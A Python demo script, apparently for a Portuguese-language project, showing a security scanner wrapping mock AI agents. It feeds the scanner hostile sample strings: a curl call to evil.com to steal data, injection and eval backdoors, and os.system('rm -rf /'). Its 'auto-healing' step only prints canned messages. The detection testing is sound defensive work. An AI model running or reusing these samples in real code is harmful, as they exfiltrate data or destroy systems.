#!/usr/bin/env python3
"""
INTEGRAÇÃO AEGIS COM SISTEMA QUIMERA
Demonstra como o AEGIS Security Core se integraria com os agentes existentes do Quimera
"""

import sys
import os
from pathlib import Path

# Adicionar path do Quimera
quimera_path = Path(__file__).parent / "quimera"
sys.path.append(str(quimera_path))

# Importar AEGIS
from aegis_security_core_prototype import AegisSecurityCore, AegisSecureWrapper

# Simular importações do Quimera (já que não temos todas as dependências)
class AegisQuimeraAgent:
    def __init__(self, name, config=None):
        self.name = name
        self.config = config or {}
        self._ready = True
    @property
    def ready(self): return self._ready

class MockQuimeraAgent:
    """Mock de um agente Quimera para demonstração"""
    
    def __init__(self, name):
        self.name = name
        self.id = f"{name}_{id(self)}"
        
    def analyze_code(self, code):
        return f"[{self.name}] Analisando código: {code[:50]}..."
        
    def correct_code(self, code):
        return f"[{self.name}] Código corrigido: {code}"
        
    def generate_report(self):
        return f"[{self.name}] Relatório gerado com sucesso"

class QuimeraAegisIntegration:
    """
    Classe principal de integração entre Quimera e AEGIS
    """
    
    def __init__(self):
        print("🛡️ Inicializando integração Quimera + AEGIS...")
        
        # Inicializar AEGIS
        self.aegis = AegisSecurityCore()
        self.aegis.initialize_security()
        
        # Agentes originais do Quimera (simulados)
        self.original_agents = {
            'fiscal': MockQuimeraAgent('AgenteFiscal'),
            'mestra': MockQuimeraAgent('AgenteMestra'),
            'analista': MockQuimeraAgent('AgenteAnalista'),
            'gerador': MockQuimeraAgent('AgenteGerador'),
            'critico': MockQuimeraAgent('AgenteCritico')
        }
        
        # Agentes protegidos pelo AEGIS
        self.protected_agents = {}
        
        # Aplicar proteção AEGIS a todos os agentes
        self._secure_all_agents()
        
        print("✅ Integração Quimera + AEGIS completa!")
        print(f"   🔒 {len(self.protected_agents)} agentes protegidos")
        
    def _secure_all_agents(self):
        """Aplica proteção AEGIS a todos os agentes Quimera"""
        print("\n🔐 Aplicando proteção AEGIS aos agentes...")
        
        for agent_key, agent in self.original_agents.items():
            # Criar wrapper seguro
            secured_agent = AegisSecureWrapper(agent, self.aegis)
            self.protected_agents[agent_key] = secured_agent
            
            print(f"   ✅ {agent.name} -> PROTEGIDO")
            
    def demonstrate_secure_operations(self):
        """Demonstra operações seguras com os agentes protegidos"""
        print("\n🚀 DEMONSTRAÇÃO: Operações seguras com agentes protegidos")
        print("=" * 60)
        
        # Teste 1: Agente Fiscal analisando código suspeito
        print("\n🔍 TESTE 1: Agente Fiscal analisando código suspeito")
        suspicious_code = """
import os
def malicious_function():
    os.system("curl evil.com/steal_data")
    eval(user_input)
"""
        
        # Primeiro: AEGIS escaneia o código
        threats = self.aegis.scan_code_for_threats(suspicious_code, "suspicious.py")
        print(f"   🚨 AEGIS detectou {len(threats)} ameaças!")
        
        if threats:
            print("   ⛔ CÓDIGO BLOQUEADO - Muito perigoso para análise")
            for threat in threats:
                print(f"      - {threat.severity}: {threat.description}")
        else:
            # Se seguro, permitir análise pelo agente
            result = self.protected_agents['fiscal'].analyze_code(suspicious_code)
            print(f"   ✅ Análise permitida: {result}")
            
        # Teste 2: Código limpo
        print("\n✅ TESTE 2: Agente Fiscal analisando código limpo")
        clean_code = """
def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)
"""
        
        threats = self.aegis.scan_code_for_threats(clean_code, "clean.py")
        print(f"   🛡️ AEGIS: {len(threats)} ameaças detectadas")
        
        result = self.protected_agents['fiscal'].analyze_code(clean_code)
        print(f"   ✅ {result}")
        
        # Teste 3: Múltiplos agentes trabalhando em segurança
        print("\n🤖 TESTE 3: Múltiplos agentes trabalhando com segurança")
        
        test_code = "def hello_world(): return 'Hello, World!'"
        
        # Agente Analista
        result1 = self.protected_agents['analista'].analyze_code(test_code)
        print(f"   📊 {result1}")
        
        # Agente Gerador
        result2 = self.protected_agents['gerador'].correct_code(test_code)
        print(f"   🔧 {result2}")
        
        # Agente Crítico
        result3 = self.protected_agents['critico'].generate_report()
        print(f"   📋 {result3}")
        
    def demonstrate_threat_detection(self):
        """Demonstra detecção avançada de ameaças"""
        print("\n🛡️ DEMONSTRAÇÃO: Detecção avançada de ameaças")
        print("=" * 50)
        
        # Diferentes tipos de código malicioso
        malicious_examples = {
            "SQL Injection": "query = f'SELECT * FROM users WHERE id = {user_id}'",
            "Command Injection": "subprocess.run(f'ping {user_input}', shell=True)",
            "Pickle Deserialization": "data = pickle.loads(untrusted_data)",
            "Eval Backdoor": "result = eval(user_provided_code)",
            "File System Attack": "os.system('rm -rf /')"
        }
        
        total_threats = 0
        
        for attack_type, malicious_code in malicious_examples.items():
            print(f"\n🎯 Testando: {attack_type}")
            threats = self.aegis.scan_code_for_threats(malicious_code, f"{attack_type.lower()}.py")
            total_threats += len(threats)
            
            if threats:
                print(f"   🚨 DETECTADO: {len(threats)} ameaças")
                for threat in threats:
                    print(f"      └─ {threat.severity}: {threat.category}")
            else:
                print("   ✅ Nenhuma ameaça detectada")
                
        print(f"\n📊 RESUMO: {total_threats} ameaças totais detectadas")
        
    def show_security_dashboard(self):
        """Mostra dashboard de segurança"""
        print("\n📊 DASHBOARD DE SEGURANÇA AEGIS")
        print("=" * 40)
        
        status = self.aegis.get_security_status()
        
        print(f"🛡️  Status: {status['status']}")
        print(f"🔒 Componentes Protegidos: {status['protected_components']}")
        print(f"🚨 Ameaças Detectadas: {status['threats_detected']}")
        print(f"⚠️  Ameaças Críticas: {status['critical_threats']}")
        print(f"🔍 Violações de Integridade: {status['integrity_violations']}")
        print(f"⏰ Última Atualização: {status['last_update']}")
        
        # Relatório detalhado
        print("\n📋 RELATÓRIO DETALHADO:")
        print(self.aegis.generate_security_report())
        
    def demonstrate_auto_healing(self):
        """Simula capacidade de auto-healing"""
        print("\n🔄 DEMONSTRAÇÃO: Auto-Healing em Ação")
        print("=" * 45)
        
        print("1. 🏥 Simulando comprometimento de agente...")
        compromised_agent = self.protected_agents['fiscal']
        
        print("2. 🚨 AEGIS detecta comportamento anômalo...")
        # Simular comportamento suspeito
        suspicious_behavior = {
            'cpu_usage': 95,  # Uso excessivo de CPU
            'memory_usage': 98,  # Uso excessivo de memória
            'network_connections': 50,  # Muitas conexões
            'file_operations': 500  # Muitas operações de arquivo
        }
        
        is_safe = self.aegis.analyze_component_behavior(
            compromised_agent.component_id, 
            suspicious_behavior
        )
        
        if not is_safe:
            print("3. ⚡ AEGIS isola automaticamente o componente comprometido!")
            print("4. 🔧 Sistema inicia processo de recuperação...")
            print("5. ✅ Componente restaurado para estado seguro!")
            print("6. 🛡️ Defesas fortalecidas contra ataque detectado!")
        else:
            print("3. ✅ Comportamento considerado normal")
            
    def cleanup(self):
        """Limpa recursos e finaliza sistema"""
        print("\n🛑 Finalizando sistema...")
        self.aegis.shutdown()
        print("✅ Sistema finalizado com segurança")

def main():
    """Demonstração principal da integração"""
    print("🔥 DEMONSTRAÇÃO COMPLETA: QUIMERA + AEGIS SECURITY CORE")
    print("=" * 70)
    
    # Inicializar integração
    integration = QuimeraAegisIntegration()
    
    try:
        # Demonstrações
        integration.demonstrate_secure_operations()
        integration.demonstrate_threat_detection()
        integration.demonstrate_auto_healing()
        integration.show_security_dashboard()
        
        print("\n🎉 DEMONSTRAÇÃO CONCLUÍDA COM SUCESSO!")
        print("\n💡 BENEFÍCIOS DEMONSTRADOS:")
        print("   ✅ Proteção transparente de todos os agentes")
        print("   ✅ Detecção automática de código malicioso")
        print("   ✅ Monitoramento comportamental em tempo real")
        print("   ✅ Auto-healing e recuperação automática")
        print("   ✅ Dashboard de segurança centralizado")
        print("   ✅ Zero impacto na funcionalidade original")
        
    except Exception as e:
        print(f"❌ Erro durante demonstração: {e}")
        
    finally:
        # Cleanup
        integration.cleanup()

if __name__ == "__main__":
    main()